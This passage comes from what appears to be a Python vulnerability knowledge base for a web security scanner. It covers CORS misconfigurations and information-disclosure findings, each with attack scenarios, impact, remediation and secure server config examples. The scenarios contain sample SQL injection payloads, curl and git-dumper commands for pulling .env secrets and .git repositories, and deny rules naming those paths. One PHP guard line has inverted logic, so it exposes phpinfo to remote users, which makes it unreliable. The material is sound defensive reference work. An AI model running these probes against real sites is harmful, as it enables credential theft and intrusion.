        "6. Attacker exfiltrates the data — full account takeover if the "
        "response includes a session token"
    ),
    "impact": (
        "Full cross-origin data theft from any authenticated endpoint that "
        "reflects origin. With credentialed requests honored, this is the "
        "practical equivalent of disabling the same-origin policy for "
        "those endpoints. Attackers can read PII, perform state-changing "
        "actions on behalf of the victim, and exfiltrate session tokens."
    ),
    "remediation": [
        "Replace origin reflection with an explicit allowlist. Compare "
        "the incoming Origin against a hard-coded set of trusted origins "
        "and only set ACAO if it matches.",
        "Never reflect arbitrary input into security headers without "
        "validation. Treat Origin like any other user-supplied value: "
        "validate, then output.",
        "If multiple origins need access, return the specific matching "
        "origin per request (do not echo arbitrary input).",
        "Add `Vary: Origin` to prevent cache poisoning between origins.",
    ],
    "code_examples": {
        "nginx": (
            "map $http_origin $cors_allow {\n"
            "    default \"\";\n"
            "    \"https://app.example.com\" \"https://app.example.com\";\n"
            "    \"https://admin.example.com\" \"https://admin.example.com\";\n"
            "}\n"
            "add_header Access-Control-Allow-Origin $cors_allow always;\n"
            "add_header Vary \"Origin\" always;\n"
            "# NEVER: add_header Access-Control-Allow-Origin $http_origin;"
        ),
        "apache": (
            "SetEnvIf Origin \"^https://(app|admin)\\.example\\.com$\" CORS_OK\n"
            "Header set Access-Control-Allow-Origin \"%{CORS_OK}e\" env=CORS_OK\n"
            "Header merge Vary \"Origin\"\n"
            "# NEVER: Header set Access-Control-Allow-Origin \"%{Origin}e\""
        ),
        "express": (
            "const ALLOW = new Set(['https://app.example.com']);\n"
            "app.use((req, res, next) => {\n"
            "  const origin = req.headers.origin;\n"
            "  if (origin && ALLOW.has(origin)) {\n"
            "    res.setHeader('Access-Control-Allow-Origin', origin);\n"
            "    res.setHeader('Vary', 'Origin');\n"
            "  }\n"
            "  next();\n"
            "});\n"
            "# NEVER: res.setHeader('Access-Control-Allow-Origin', req.headers.origin);"
        ),
        "flask": (
            "ALLOW = {'https://app.example.com'}\n"
            "@app.after_request\n"
            "def cors(resp):\n"
            "    o = flask.request.headers.get('Origin')\n"
            "    if o in ALLOW:\n"
            "        resp.headers['Access-Control-Allow-Origin'] = o\n"
            "        resp.headers['Vary'] = 'Origin'\n"
            "    return resp"
        ),
        "django": (
            "def cors_allow(request):\n"
            "    origin = request.META.get('HTTP_ORIGIN')\n"
            "    if origin in ALLOWED_ORIGINS:\n"
            "        response['Access-Control-Allow-Origin'] = origin\n"
            "        response['Vary'] = 'Origin'\n"
            "    return response"
        ),
    },
}

CORS_WILDCARD_WITH_CREDENTIALS: VulnEntry = {
    "summary": (
        "The server sets both `Access-Control-Allow-Origin: *` and "
        "`Access-Control-Allow-Credentials: true`. Modern browsers refuse "
        "to honor this combination, but misconfigured CDNs, reverse proxies, "
        "or non-browser clients can strip the wildcard check and treat the "
        "configuration as if any origin is allowed with credentials. This "
        "is a CRITICAL misconfiguration."
    ),
    "technical": (
        "Per the CORS specification, the `*` wildcard is incompatible with "
        "`Access-Control-Allow-Credentials: true`. Browsers refuse to send "
        "or honor the response, returning a console error. However, "
        "middleware that strips the credentials header (or that does not "
        "know about the CORS spec — older proxies, CDNs in legacy mode, "
        "non-browser HTTP clients) may still apply the wildcard and "
        "successfully process credentialed requests. The result is the "
        "same as origin reflection but is harder to detect because the "
        "origin 'mismatch' is invisible to the client."
    ),
    "attack_scenario": (
        "1. Application behind a CDN that strips ACAO credentials mismatch "
        "checks (or a non-browser client like a mobile app using a "
        "WebView that doesn't enforce the spec)\n"
        "2. Backend sets `Access-Control-Allow-Origin: *` and "
        "`Access-Control-Allow-Credentials: true`\n"
        "3. Attacker hosts https://evil.example and uses a non-standard "
        "client or bypass to issue credentialed XHR\n"
        "4. CDN forwards the request with the victim's cookies; "
        "backend responds with `*` and credentials\n"
        "5. Attacker reads the response\n"
        "Or simpler: the application is served from both a browser "
        "context (where the spec protects) and a non-browser context "
        "(where it doesn't) — attacker exploits the latter"
    ),
    "impact": (
        "Critical credentialed data exposure. When the spec is enforced "
        "the impact is reduced to a console error, but any environment "
        "where the spec is not enforced — a CDN, a proxy, an embedded "
        "WebView, a native mobile client — is exposed. This is a recurring "
        "real-world finding in bug bounty programs precisely because it "
        "survives the standard browser defenses."
    ),
    "remediation": [
        "Never combine `Access-Control-Allow-Origin: *` with "
        "`Access-Control-Allow-Credentials: true`. Replace `*` with an "
        "explicit allowlist of trusted origins.",
        "Audit the full stack — CDN, reverse proxy, load balancer — for "
        "places where the CORS spec enforcement is bypassed.",
        "If you need credentialed CORS, respond with the specific "
        "matching origin (after allowlist check) and set credentials to "
        "true only for that origin.",
        "Use Content-Security-Policy to further restrict which origins "
        "can frame or include your content.",
    ],
    "code_examples": {
        "nginx": (
            "# NEVER do this:\n"
            "# add_header Access-Control-Allow-Origin \"*\" always;\n"
            "# add_header Access-Control-Allow-Credentials \"true\" always;\n"
            "# Use a specific origin instead:\n"
            "map $http_origin $cors_allow {\n"
            "    default \"\";\n"
            "    \"https://app.example.com\" \"https://app.example.com\";\n"
            "}\n"
            "add_header Access-Control-Allow-Origin $cors_allow always;\n"
            "add_header Access-Control-Allow-Credentials \"true\" always;"
        ),
        "apache": (
            "# Use SetEnvIf to restrict and never set ACAO to literal \"*\"\n"
            "SetEnvIf Origin \"^https://app\\.example\\.com$\" CORS_OK\n"
            "Header set Access-Control-Allow-Origin \"%{CORS_OK}e\" env=CORS_OK\n"
            "Header set Access-Control-Allow-Credentials \"true\" env=CORS_OK"
        ),
        "express": (
            "const ALLOW = ['https://app.example.com'];\n"
            "app.use((req, res, next) => {\n"
            "  if (ALLOW.includes(req.headers.origin)) {\n"
            "    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);\n"
            "    res.setHeader('Access-Control-Allow-Credentials', 'true');\n"
            "    res.setHeader('Vary', 'Origin');\n"
            "  }\n"
            "  next();\n"
            "});"
        ),
        "flask": (
            "from flask_cors import CORS\n"
            "CORS(app, origins=['https://app.example.com'], supports_credentials=True)"
        ),
        "django": (
            "CORS_ALLOWED_ORIGINS = ['https://app.example.com']\n"
            "CORS_ALLOW_CREDENTIALS = True  # with specific origins only"
        ),
    },
}

# ---------------------------------------------------------------------------
# information-disclosure
# ---------------------------------------------------------------------------

DISCLOSURE_VERSION_BANNER: VulnEntry = {
    "summary": (
        "The response includes a `Server` or `X-Powered-By` header that "
        "discloses the exact software version (e.g. `nginx/1.18.0`, "
        "`Express`, `PHP/7.4.3`). Public vulnerability databases index "
        "every version of every web server; advertising yours lets an "
        "attacker look up CVEs that match your stack without doing any "
        "reconnaissance themselves."
    ),
    "technical": (
        "Web servers and frameworks often auto-add headers identifying "
        "themselves. `Server` is set by Apache, nginx, IIS. `X-Powered-By` "
        "is set by PHP, ASP.NET, Express. Exact version strings are even "
        "more valuable than names. Tools like Shodan, Censys, and "
        "vulnerability scanners ingest these headers at scale to build "
        "asset inventories and CVE match lists. Removing the version (or "
        "the header entirely) gives an attacker one more step to perform "
        "before they can target specific CVEs."
    ),
    "attack_scenario": (
        "1. Attacker runs a port scan on the target's IP range\n"
        "2. Server responds with `Server: nginx/1.14.0`\n"
        "3. Attacker searches "
        "`https://vulners.com/search?query=nginx+1.14.0` and discovers "
        "CVE-2019-20372 (error_page request smuggling)\n"
        "4. Attacker checks the target's exact version against the "
        "CVE's affected list — match\n"
        "5. Attacker fires off the exploit without further recon\n"
        "Without the version, the attacker would have to fingerprint "
        "manually or try broader exploits"
    ),
    "impact": (
        "Faster, more reliable target identification by adversaries. "
        "Specific CVEs can be matched to your stack without active probing. "
        "In large-scale attacks (botnets, worms), version-specific exploits "
        "are launched automatically. Disclosing versions also signals to "
        "attackers whether you're running an outdated stack — a strong "
        "indicator of broader security hygiene issues."
    ),
    "remediation": [
        "Set `server_tokens off;` in nginx to remove the version from "
        "the Server header.",
        "In Apache, set `ServerTokens Prod` (and `ServerSignature Off`) "
        "to emit only `Server: Apache`.",
        "In Express, call `app.disable('x-powered-by')` to remove "
        "`X-Powered-By: Express`.",
        "In IIS, configure `removeServerHeader=true` via web.config.",
        "Strip or rewrite these headers at the reverse proxy as a "
        "defense-in-depth measure.",
    ],
    "code_examples": {
        "nginx": "server_tokens off;  # in http {} or server {} block",
        "apache": (
            "ServerTokens Prod\n"
            "ServerSignature Off"
        ),
        "express": (
            "const app = express();\n"
            "app.disable('x-powered-by');"
        ),
        "iis": (
            "<!-- web.config -->\n"
            "<system.webServer>\n"
            "  <security>\n"
            "    <requestFiltering removeServerHeader=\"true\" />\n"
            "  </security>\n"
            "</system.webServer>"
        ),
        "flask": (
            "@app.after_request\n"
            "def strip_server(resp):\n"
            "    resp.headers.pop('Server', None)\n"
            "    resp.headers.pop('X-Powered-By', None)\n"
            "    return resp"
        ),
    },
}

DISCLOSURE_STACK_TRACE: VulnEntry = {
    "summary": (
        "The response body contains a stack trace or detailed error message "
        "(e.g. Python `Traceback (most recent call last):`, Java `at "
        "com.example.Class.method(File.java:42)`, or PHP `Fatal error: ... "
        "on line 87`). Stack traces reveal internal file paths, library "
        "versions, function names, and sometimes database query fragments."
    ),
    "technical": (
        "When an exception is thrown in development mode, frameworks "
        "commonly render the full traceback in the HTTP response for "
        "debugging. In production this is a serious leak: the traceback "
        "includes the absolute file paths on the server (revealing "
        "usernames, project structure, OS), library versions (matching "
        "CVE databases), and line numbers (which map directly to source "
        "code an attacker can search for). Production deployments should "
        "log the traceback to a secure log sink and return a generic "
        "error page to the user."
    ),
    "attack_scenario": (
        "1. Attacker triggers an error by sending an invalid request, e.g. "
        "a malformed JSON body to /api/submit\n"
        "2. Server is in debug mode and renders the traceback inline\n"
        "3. Attacker reads the traceback: "
        "`File \"/home/deploy/app/blueprints/api.py\", line 87, in submit`\n"
        "4. Attacker learns the app runs as `deploy` user, uses Flask "
        "blueprints, and the source is at `/home/deploy/app/`\n"
        "5. Attacker now knows where to look for path-traversal targets, "
        "what framework version to target, and which usernames to try in "
        "credential attacks"
    ),
    "impact": (
        "Reconnaissance goldmine: file paths, usernames, library versions, "
        "line numbers, and sometimes even database query fragments or "
        "environment variable values. Stack traces also indicate that the "
        "application is running in debug mode — a strong signal of weak "
        "production hardening. In combination with other findings, this "
        "data accelerates exploitation dramatically."
    ),
    "remediation": [
        "Disable debug mode in production: in Flask, set "
        "`app.debug = False` and `PROPAGATE_EXCEPTIONS = False`.",
        "Configure a custom error handler that returns a generic response "
        "and logs the traceback to a secure log sink: "
        "`@app.errorhandler(Exception)`.",
        "Set `FLASK_ENV=production` (or `DJANGO_SETTINGS_MODULE=prod`) "
        "explicitly via environment; never rely on framework defaults.",
        "In Django, set `DEBUG = False` and configure "
        "`ALLOWED_HOSTS` strictly.",
    ],
    "code_examples": {
        "flask": (
            "app = Flask(__name__)\n"
            "app.debug = False\n"
            "app.config['PROPAGATE_EXCEPTIONS'] = False\n"
            "@app.errorhandler(Exception)\n"
            "def handle(e):\n"
            "    app.logger.exception('uncaught')\n"
            "    return 'internal error', 500"
        ),
        "django": (
            "# settings.py\n"
            "DEBUG = False\n"
            "ALLOWED_HOSTS = ['app.example.com']\n"
            "# Use sentry-sdk or django-sentry for production logging"
        ),
        "express": (
            "if (process.env.NODE_ENV === 'production') {\n"
            "  app.use((err, req, res, next) => {\n"
            "    logger.error(err);\n"
            "    res.status(500).send('internal error');\n"
            "  });\n"
            "}"
        ),
        "nginx": (
            "# serve a generic 500 page at /usr/share/nginx/html/50x.html\n"
            "error_page 500 502 503 504 /50x.html;\n"
            "location = /50x.html { internal; }"
        ),
        "php": (
            "# php.ini\n"
            "display_errors = Off\n"
            "log_errors = On\n"
            "error_log = /var/log/php_errors.log"
        ),
    },
}

DISCLOSURE_DB_ERROR: VulnEntry = {
    "summary": (
        "The response body contains a database error message "
        "(e.g. `SQLSTATE[HY000]`, `mysql_fetch_array()`, `ORA-00942`, "
        "`SQLite/JDBCDriver`). These messages reveal the DBMS vendor, "
        "table or column names, query fragments, and sometimes even "
        "connection string details."
    ),
    "technical": (
        "ORMs and raw SQL libraries can leak driver-level error messages "
        "when an exception is thrown and not caught at a boundary. "
        "SQLSTATE codes map to DB2-style error numbers; `mysql_fetch_array` "
        "indicates a raw mysql extension call; `ORA-NNNNN` is unmistakably "
        "Oracle. Query fragments in the error (e.g. `WHERE id = ' AND "
        "name = 'admin`) can reveal the SQL structure and aid injection "
        "exploitation. Production error handlers must catch and replace "
        "DB-level errors before they reach the user."
    ),
    "attack_scenario": (
        "1. Attacker sends a malformed parameter to /api/users?id=' OR 1=1--\n"
        "2. Server has unhandled SQL error; the response body contains:\n"
        "   `SQLSTATE[HY000]: General error: 1064 You have an error in your "
        "SQL syntax near 'OR 1=1--' at line 1`\n"
        "3. Attacker learns: DB is MySQL, query uses string concatenation "
        "(no parameterization), exact syntax error location\n"
        "4. Attacker refines payload: `id=1' OR '1'='1`\n"
        "5. With knowledge of MySQL syntax the attacker crafts a working "
        "SQLi exploit in minutes"
    ),
    "impact": (
        "Direct aid to SQL injection exploitation. The error reveals the "
        "DBMS vendor, the structure of the query, and often the exact "
        "vulnerable parameter. Attackers can convert a probing SQLi attempt "
        "into a working exploit in a fraction of the time it would take "
        "blindly. Database errors can also leak PII from the failed query "
        "(e.g. partial row contents)."
    ),
    "remediation": [
        "Wrap every database call in a try/except and return a generic "
        "error to the user; log the full error server-side.",
        "Use parameterized queries / prepared statements so malformed "
        "input never produces a syntax error.",
        "Set `display_errors = Off` in PHP and equivalent in your "
        "language/framework.",
        "In production, configure a WAF or framework middleware to "
        "scrub database error patterns from responses.",
    ],
    "code_examples": {
        "flask": (
            "@app.errorhandler(Exception)\n"
            "def handle(e):\n"
            "    app.logger.exception('db error: %s', e)\n"
            "    return 'internal error', 500  # never leak e.message"
        ),
        "django": (
            "# settings.py\n"
            "DEBUG = False\n"
            "# Use django.db.utils.DatabaseError handler:\n"
            "from django.db.utils import DatabaseError\n"
            "def db_error_handler(request):\n"
            "    return HttpResponse('internal error', status=500)"
        ),
        "express": (
            "app.use((err, req, res, next) => {\n"
            "  if (err.code && /^SQL/i.test(err.code)) {\n"
            "    logger.error('db error', err);\n"
            "    return res.status(500).send('internal error');\n"
            "  }\n"
            "  next(err);\n"
            "});"
        ),
        "php": (
            "# php.ini\n"
            "display_errors = Off\n"
            "log_errors = On\n"
            "# PDO: $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n"
            "# but catch in user code, never echo the exception"
        ),
        "python_orator_sqlalchemy": (
            "try:\n"
            "    result = session.query(User).filter_by(id=user_id).first()\n"
            "except SQLAlchemyError as e:\n"
            "    logger.exception('db')\n"
            "    return None  # never return str(e) to user"
        ),
    },
}

DISCLOSURE_HTML_COMMENT: VulnEntry = {
    "summary": (
        "The response body contains an HTML comment with sensitive keywords "
        "(`TODO`, `FIXME`, `BUG`, `HACK`, internal hostnames, IP addresses). "
        "These comments are rendered to the browser but invisible to users "
        "— making them a frequent source of leaked internal information, "
        "test credentials, or unfinished security work."
    ),
    "technical": (
        "HTML comments (`<!-- ... -->`) are not displayed by the browser "
        "but are part of the page source and easily retrieved via View "
        "Source, browser DevTools, or a simple `curl`. Developers routinely "
        "leave TODO comments with file paths, internal hostnames, or "
        "shortcuts they intend to remove later. `<!-- TODO: remove debug "
        "-->` reveals that a debug surface exists; `<!-- FIXME: auth "
        "bypass for admin -->` reveals a security control in flux. "
        "Comments also reveal the development framework and version "
        "(`<!-- generated by wordpress 6.4 -->`)."
    ),
    "attack_scenario": (
        "1. Attacker runs `curl https://target.example/` and reads the "
        "HTML source\n"
        "2. Finds `<!-- TODO: integrate staging API at "
        "https://staging.internal.target.example/v2 -->`\n"
        "3. Attacker attempts to reach the staging API from outside the "
        "VPN — succeeds because it was never meant to be public but is "
        "reachable on the same public hostname\n"
        "4. Staging API has weaker auth (or no auth); attacker exfiltrates "
        "data from the staging environment, which may share infrastructure "
        "with production"
    ),
    "impact": (
        "Leaks of internal hostnames, file paths, unfinished features, "
        "test credentials, planned security controls, or vendor/framework "
        "versions. These comments are gold for reconnaissance: they "
        "reveal the development team's mental model of the application "
        "and often point directly to endpoints that are not yet fully "
        "secured."
    ),
    "remediation": [
        "Strip HTML comments from production templates. In Jinja2: "
        "use `{%- comment -%} ... {%- endcomment -%}` blocks; in Django: "
        "use `{% comment %} ... {% endcomment %}`.",
        "Add a build-time check: grep the deployed HTML for `<!--` and "
        "fail the build if any comments remain.",
        "Audit existing comments for sensitive content; remove any that "
        "reference internal infrastructure or unfinished work.",
        "Use server-side rendering with comments removed in the production "
        "build (Webpack `TerserPlugin` for JS, `html-minifier` for HTML).",
    ],
    "code_examples": {
        "flask": (
            "# Jinja2: production builds strip comments automatically when\n"
            "# you set jinja_env.comment_start_string to something the\n"
            "# templates never use, OR use `{% comment %}` blocks which\n"
            "# are removed at render time."
        ),
        "django": (
            "# {% comment %} ... {% endcomment %} is removed at render time.\n"
            "# Build-time audit:\n"
            "import re, pathlib\n"
            "for f in pathlib.Path('templates/').rglob('*.html'):\n"
            "    if re.search(r'<!--(?!\\s*\\[if )', f.read_text()):\n"
            "        print(f'comment in {f}'); raise SystemExit(1)"
        ),
        "express": (
            "// Use express-minify-html or html-minifier-terser\n"
            "const minify = require('html-minifier-terser');\n"
            "app.use((req, res, next) => {\n"
            "  const orig = res.send.bind(res);\n"
            "  res.send = async body => orig(minify(await body, "
            "{ removeComments: true }));\n"
            "  next();\n"
            "});"
        ),
        "build_step": (
            "# Webpack config:\n"
            "const HtmlWebpackPlugin = require('html-webpack-plugin');\n"
            "module.exports = {\n"
            "  plugins: [new HtmlWebpackPlugin({ minify: { "
            "removeComments: true } })]\n"
            "};"
        ),
        "nginx": (
            "# sub_filter can strip comments from served HTML:\n"
            "sub_filter '<!--' '';\n"
            "sub_filter '-->' '';\n"
            "sub_filter_types text/html;\n"
            "sub_filter_once off;"
        ),
    },
}

DISCLOSURE_EXPOSED_ENV: VulnEntry = {
    "summary": (
        "A `.env`, `.env.production`, or similar environment file is served "
        "from the web root. These files routinely contain database "
        "credentials, API keys, OAuth client secrets, and infrastructure "
        "tokens. Exposure is often the result of a deployment error that "
        "copies the local `.env` into the public directory."
    ),
    "technical": (
        "Modern frameworks (Node.js, Laravel, Django, Rails) read "
        "configuration from a `.env` file via libraries like dotenv. "
        "These files contain `KEY=VALUE` pairs with database URIs, "
        "session secrets, third-party API keys, and OAuth credentials. "
        "If the deployment script `cp -r . /var/www/html/` includes dot "
        "files, the `.env` becomes publicly accessible at "
        "`https://target.example/.env`. There is no legitimate reason "
        "for a web server to serve these files — they must be excluded "
        "from the document root."
    ),
    "attack_scenario": (
        "1. Attacker runs `curl https://target.example/.env` "
        "(automated tools like nuclei, feroxbuster have this in their "
        "default wordlists)\n"
        "2. Server responds with `DB_HOST=db.internal DB_USER=app "
        "DB_PASS=hunter2 STRIPE_SECRET_KEY=sk_live_...`\n"
        "3. Attacker connects to the internal database directly "
        "(if reachable) or via SQL injection\n"
        "4. Attacker uses the Stripe live secret key to issue refunds, "
        "dump customer data, or perform other actions as the merchant\n"
        "5. Attacker now owns the application"
    ),
    "impact": (
        "Total compromise if the .env contains production credentials. "
        "Common payloads include: cloud provider keys (AWS, GCP, Azure — "
        "account takeover), database credentials (data theft), payment "
        "processor live keys (financial loss), OAuth client secrets "
        "(identity theft), JWT secrets (forge tokens), email service "
        "credentials (phishing from your domain)."
    ),
    "remediation": [
        "Block all dotfiles at the web server: in nginx, "
        "`location ~ /\\. { deny all; }`. In Apache, `<FilesMatch \"^\\.\"> "
        "Require all denied</FilesMatch>`.",
        "Verify your deployment script does not copy `.env` into the "
        "document root. Use `.gitignore` and CI/CD exclusions.",
        "Add a robots.txt disallow rule as a weak secondary defense; "
        "do not rely on it for security.",
        "Rotate every credential that was exposed. Assume compromise: "
        "regenerate all secrets, invalidate all sessions, audit access "
        "logs for the period of exposure.",
    ],
    "code_examples": {
        "nginx": (
            "location ~ /\\. {\n"
            "    deny all;\n"
            "    return 404;\n"
            "}\n"
            "# Or use a try_files to ensure dotfiles 404:\n"
            "location ~ /\\.(env|git|svn) { deny all; return 404; }"
        ),
        "apache": (
            "<FilesMatch \"^\\.(env|git|svn)\">\n"
            "    Require all denied\n"
            "</FilesMatch>"
        ),
        "express": (
            "app.use((req, res, next) => {\n"
            "  if (/^\\/\\./.test(req.path)) return res.status(404).end();\n"
            "  next();\n"
            "});\n"
            "# Or: never serve .env from /public; keep it outside documentRoot"
        ),
        "deployment": (
            "# .gitignore and deploy script:\n"
            "rsync -av --exclude='.env*' --exclude='.git' ./ /var/www/html/"
        ),
        "docker": (
            "# Dockerfile:\n"
            "COPY --chown=app:app app /app\n"
            "# But NEVER COPY .env into the image; pass secrets at runtime:\n"
            "docker run -e DB_PASS=\"$DB_PASS\" myimage"
        ),
    },
}

DISCLOSURE_EXPOSED_DEBUG: VulnEntry = {
    "summary": (
        "A debug endpoint (`/debug`, `/api/_debug`, `/admin/debug`) is "
        "reachable without authentication and returns runtime internals — "
        "Python version, Flask routes, environment variables, active "
        "sessions, sometimes even direct database access. Debug endpoints "
        "are intended for development and should never be exposed in "
        "production."
    ),
    "technical": (
        "Debug endpoints are commonly added by frameworks in development "
        "mode (Flask `/debug`, Django Debug Toolbar) or by developers as "
        "a quick way to inspect application state. They return rich "
        "internal data: route maps, environment variables, request "
        "context, database queries, sometimes even admin actions. "
        "Werkzeug's interactive debugger (when `debug=True`) is a remote "
        "code execution vulnerability if exposed — the debugger console "
        "accepts arbitrary Python code. Even non-interactive debug "
        "endpoints leak enough information to mount targeted attacks."
    ),
    "attack_scenario": (
        "1. Attacker runs a directory brute force and finds "
        "`/debug` returning 200\n"
        "2. Response contains the full route map (every URL the app "
        "serves), Flask version, all environment variables including "
        "API keys, and the Python version\n"
        "3. Attacker maps the route list to known CVEs for that "
        "framework version\n"
        "4. Attacker reads API keys from env vars and uses them to "
        "access the database, payment processor, or cloud provider\n"
        "5. With Werkzeug debug enabled, attacker executes arbitrary "
        "Python in the application context — full RCE"
    ),
    "impact": (
        "Critical disclosure of internal state. At minimum, route maps "
        "and config reveal attack surface; at worst, exposed debug "
        "endpoints enable remote code execution (Werkzeug, Tornado, "
        "Rails `better_errors`). Even a benign debug page that returns "
        "request headers can leak Authorization tokens if a downstream "
        "service forwards them."
    ),
    "remediation": [
        "Remove or disable all debug endpoints in production: in Flask, "
        "`app.debug = False` and `use_debugger = False`.",
        "Add an environment-based guard: only register the debug "
        "blueprint when `app.config['ENV'] == 'development'`.",
        "Block access at the reverse proxy: `location /debug { deny all; }`.",
        "Audit route maps for `/debug`, `/_debug`, `/admin/debug`, "
        "`/__debug__`, and similar patterns.",
    ],
    "code_examples": {
        "flask": (
            "if app.config['ENV'] == 'development':\n"
            "    from myapp.debug import debug_bp\n"
            "    app.register_blueprint(debug_bp)\n"
            "# Werkzeug debugger: never enable in production\n"
            "app.run(debug=False)"
        ),
        "django": (
            "# settings.py\n"
            "DEBUG = False\n"
            "# Never install django-debug-toolbar in production\n"
            "# INSTALLED_APPS should not contain 'debug_toolbar'"
        ),
        "express": (
            "if (process.env.NODE_ENV !== 'production') {\n"
            "  app.get('/debug', require('./routes/debug'));\n"
            "}"
        ),
        "nginx": (
            "location ~ ^/(debug|_debug|admin/debug|__debug__) {\n"
            "    deny all;\n"
            "    return 404;\n"
            "}"
        ),
        "generic": (
            "# CI check:\n"
            "grep -rn 'app.run(.*debug' src/ && exit 1\ngrep -rn '/debug' src/routes/ && exit 1"
        ),
    },
}

DISCLOSURE_EXPOSED_PANEL: VulnEntry = {
    "summary": (
        "A management or status panel (`/server-status`, `/server-info`, "
        "`/phpinfo.php`) is publicly accessible. These panels reveal active "
        "connections, request logs, server configuration, and loaded "
        "modules. Apache `server-status` is a frequent find — it lists "
        "every recent request including URLs that may not be linked from "
        "the main site."
    ),
    "technical": (
        "Apache `mod_status` exposes `/server-status` showing recent "
        "requests, worker status, and connection counts. `/server-info` "
        "lists every loaded module with version info. PHP `phpinfo()` "
        "dumps every PHP setting, environment variable, and module — a "
        "goldmine for attackers. These endpoints are often enabled by "
        "default in development configurations and accidentally deployed "
        "to production."
    ),
    "attack_scenario": (
        "1. Attacker requests `/server-status` — Apache returns the last "
        "100 requests including IPs, URLs, and user agents\n"
        "2. Attacker discovers URLs not linked anywhere on the site: "
        "`/admin/legacy-import`, `/internal/sync`, `/api/v2/debug`\n"
        "3. Attacker enumerates these hidden endpoints for further "
        "vulnerabilities\n"
        "4. `/phpinfo.php` reveals `DOCUMENT_ROOT`, "
        "`_SERVER['SERVER_ADMIN']`, the loaded PHP extensions and "
        "versions — direct CVE matching\n"
        "5. Attacker now has a complete map of the server's attack "
        "surface"
    ),
    "impact": (
        "Reconnaissance shortcut. Apache `server-status` lists recent "
        "requests including those to admin or internal endpoints. "
        "`phpinfo()` leaks the full PHP configuration including "
        "credentials, document root, and library versions. Once an "
        "attacker has these, every subsequent attack is targeted rather "
        "than blind."
    ),
    "remediation": [
        "Disable Apache `mod_status` or restrict it to localhost: "
        "`<Location /server-status> Require ip 127.0.0.1 </Location>`.",
        "Remove `phpinfo.php` from production; never deploy it.",
        "Block these paths at the reverse proxy: "
        "`location ~ ^/(server-status|server-info|phpinfo\\.php) { deny all; }`.",
        "Audit your `httpd.conf` for `SetHandler server-status` and "
        "your codebase for `phpinfo()` calls.",
    ],
    "code_examples": {
        "apache": (
            "<Location \"/server-status\">\n"
            "    SetHandler server-status\n"
            "    Require local  # or Require ip 127.0.0.1\n"
            "</Location>\n"
            "<Location \"/server-info\">\n"
            "    SetHandler server-info\n"
            "    Require local\n"
            "</Location>"
        ),
        "nginx": (
            "location ~ ^/(server-status|server-info|phpinfo\\.php) {\n"
            "    deny all;\n"
            "    return 404;\n"
            "}"
        ),
        "php": (
            "# Search and remove phpinfo() calls:\n"
            "grep -rn 'phpinfo()' src/ public/ && exit 1\n"
            "# Or guard with:\n"
            "if (\\$_SERVER['REMOTE_ADDR'] !== '127.0.0.1') { phpinfo(); }"
        ),
        "deployment": (
            "# CI check: ensure phpinfo.php never lands in production\n"
            "test ! -f /var/www/html/phpinfo.php"
        ),
        "flask": (
            "# Never expose Werkzeug's interactive debugger:\n"
            "app.run(debug=False, host='127.0.0.1')"
        ),
    },
}

DISCLOSURE_EXPOSED_VCS: VulnEntry = {
    "summary": (
        "The web root exposes version-control metadata (`.git/HEAD`, "
        "`.svn/entries`). With these files, an attacker can reconstruct "
        "the full source tree, including deleted files, debug branches, "
        "and configuration that was never intended for production."
    ),
    "technical": (
        "Git stores the entire repository under `.git/` in the working "
        "tree. If the web root contains the `.git` directory (typically "
        "via a deployment error like `cp -r ./ /var/www/html/`), the "
        "attacker can fetch `/.git/HEAD`, `/.git/config`, and "
        "`/.git/objects/...` to reconstruct the source. Tools like "
        "`git-dumper` automate this. The recovered repo often contains "
        "test fixtures with hard-coded credentials, abandoned API "
        "endpoints, and TODO comments referencing internal systems."
    ),
    "attack_scenario": (
        "1. Attacker runs `git-dumper https://target.example/.git ./repo`\n"
        "2. Tool reconstructs the full repository into `./repo`\n"
        "3. Attacker reads git log: discovers branch `feature/auth-bypass` "
        "merged last month then reverted — code is in history\n"
        "4. Attacker recovers the test fixtures: `tests/fixtures/"
        "credentials.json` contains `{\"admin\": \"s3cr3t!\"}`\n"
        "5. Attacker logs into the admin panel with the recovered "
        "credential — full takeover"
    ),
    "impact": (
        "Critical: full source code disclosure, including deleted files, "
        "test fixtures, and history. Test fixtures commonly contain "
        "production credentials, internal API endpoints, and abandoned "
        "features with weaker security controls. Code review of the "
        "recovered source enables targeted exploitation of any logic "
        "flaw. `.git` exposure is one of the highest-impact "
        "misconfigurations per severity calculators."
    ),
    "remediation": [
        "Block all dotfiles at the web server: in nginx, "
        "`location ~ /\\. { deny all; }`. In Apache, `<DirectoryMatch "
        "\"^/.*\\.git\"> Require all denied</DirectoryMatch>`.",
        "Verify your deployment script never copies the `.git` "
        "directory: `rsync -av --exclude='.git' ./ /var/www/html/`.",
        "If you have already exposed `.git`, audit your git history for "
        "sensitive content and remove it from history: "
        "`git filter-branch` or `git-filter-repo`.",
        "Add a CI check that fails the build if `.git` or `.svn` "
        "appears in the deploy artifact.",
    ],
    "code_examples": {
        "nginx": (
            "location ~ /\\. {\n"
            "    deny all;\n"
            "    return 404;\n"
            "}"
        ),
        "apache": (
            "<DirectoryMatch \"^/.*\\.\">\n"
            "    Require all denied\n"
            "</DirectoryMatch>"
        ),
        "deployment": (
            "# rsync with .git excluded:\n"
            "rsync -av --exclude='.git' --exclude='.svn' --exclude='.env*' \\\n"
            "  ./ /var/www/html/"
        ),
        "docker": (
            "# Multi-stage build: copy only what's needed\n"
            "FROM node:20 AS build\n"
            "WORKDIR /app\n"
            "COPY . .\n"
            "RUN npm ci && npm run build\n"
            "\n"
            "FROM nginx\n"
            "COPY --from=build /app/dist /usr/share/nginx/html\n"
            "# .git never makes it into the final image"
        ),
        "ci_check": (
            "test ! -d /var/www/html/.git && \\\n"
            "test ! -d /var/www/html/.svn"
        ),
    },
}

DISCLOSURE_EXPOSED_CONFIG: VulnEntry = {
    "summary": (
        "A configuration file (`/config.json`, `/config.yaml`, "
        "`/config.ini`) is publicly accessible. These files often "
        "contain feature flags, database connection strings, internal "
        "API endpoints, environment names, and sometimes credentials "
        "in plaintext — all of which an attacker can read directly "
        "with a single GET request."
    ),
    "technical": (
        "Applications routinely keep feature flags, environment names, "
        "and runtime config in files like `config.json`. When these are "
        "copied to the web root for client-side consumption (e.g. a "
        "React app's `public/config.json`), they may include internal "
        "API endpoints, debug toggles, or staging URLs. Combined with "
        "test fixtures and environment variables, this can leak enough "
        "information to map the internal network and find dev/test "
        "environments."
    ),
    "attack_scenario": (
        "1. Attacker enumerates common config filenames: "
